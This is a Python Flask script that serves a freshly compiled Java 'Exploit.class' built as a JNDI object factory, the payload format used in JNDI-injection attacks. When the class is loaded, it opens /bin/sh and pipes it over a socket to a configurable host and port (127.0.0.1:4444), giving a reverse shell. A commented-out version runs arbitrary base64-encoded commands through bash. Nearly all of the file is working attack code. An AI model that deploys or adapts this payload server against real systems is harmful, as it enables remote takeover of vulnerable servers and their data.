from flask import Flask, send_file, request
import os
import subprocess

app = Flask(__name__)

@app.route('/Exploit.class')
def exploit_class():
    # base64_payload = request.args.get('p', '')
    # if not base64_payload:
    #     return "No base64 payload provided.", 400

#     java_src = f"""
# import java.io.IOException;
# import java.nio.charset.StandardCharsets;
# import java.util.Base64;

# public class Exploit {{

#     public Exploit() throws IOException {{
#         String base64Payload = "{base64_payload}";
#         String decodedPayload = new String(Base64.getDecoder().decode(base64Payload), StandardCharsets.UTF_8);

#         // Execute the decoded payload
#         Process p = new ProcessBuilder("bash", "-c", decodedPayload)
#                 .redirectErrorStream(true)
#                 .start();
#         // You can handle the process output here if needed
#     }}
# }}
# """
    TARGET_IP = "127.0.0.1"
    TARGET_PORT = 4444
    java_src = f"""
        import java.io.IOException;
        import java.io.InputStream;
        import java.io.OutputStream;
        import java.net.Socket;
        import javax.naming.Context;
        import javax.naming.Name;
        import javax.naming.spi.ObjectFactory;
        import java.util.Hashtable;
        import javax.naming.NamingException;
        import javax.naming.Reference;

        public class Exploit implements ObjectFactory {{

            public Exploit() {{
            }}

            @Override
            public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {{
                String host = "{TARGET_IP}";
                int port = {TARGET_PORT};
                String cmd = "/bin/sh";
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket s = new Socket(host, port);
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                while (!s.isClosed()) {{
                    while (pi.available() > 0)
                        so.write(pi.read());
                    while (pe.available() > 0)
                        so.write(pe.read());
                    while (si.available() > 0)
                        po.write(si.read());
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {{
                        p.exitValue();
                        break;
                    }} catch (Exception e) {{
                    }}
                }}
                p.destroy();
                s.close();
                return null;
            }}
        }}
    """

    with open("Exploit.java", "w") as f:
        f.write(java_src)

    subprocess.run(["/usr/lib/jvm/java-8-openjdk-amd64/bin/javac", "Exploit.java"])

    return send_file("Exploit.class", as_attachment=True, attachment_filename="Exploit.class")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
